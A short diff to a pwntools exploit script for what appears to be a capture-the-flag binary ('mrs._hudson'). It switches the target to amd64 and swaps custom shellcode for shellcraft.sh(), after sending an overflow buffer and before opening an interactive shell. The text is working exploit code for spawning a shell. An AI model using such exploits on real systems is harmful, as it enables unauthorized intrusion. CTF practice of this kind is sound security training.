@@ -4,7 +4,7 @@ from enert import *
 # ==============================
 # TODO:TEMPLATE FOR EXPLOITATION
 # ==============================
-context(os='linux', arch='i686')
+context(os='linux', arch='amd64')
 context.log_level = 'debug' # output verbose log
 FILE_NAME   = './mrs._hudson'
 #REMOTE_LIBC = './libc.so.6-hoge'
@@ -60,5 +60,5 @@ buf += p64(bss)
 b()
 r.readuntil("Let's go back to 2000.\n")
 r.sendline(buf)
-r.sendline(sc_execve64)
+r.sendline(asm(shellcraft.sh()))
 r.interactive()
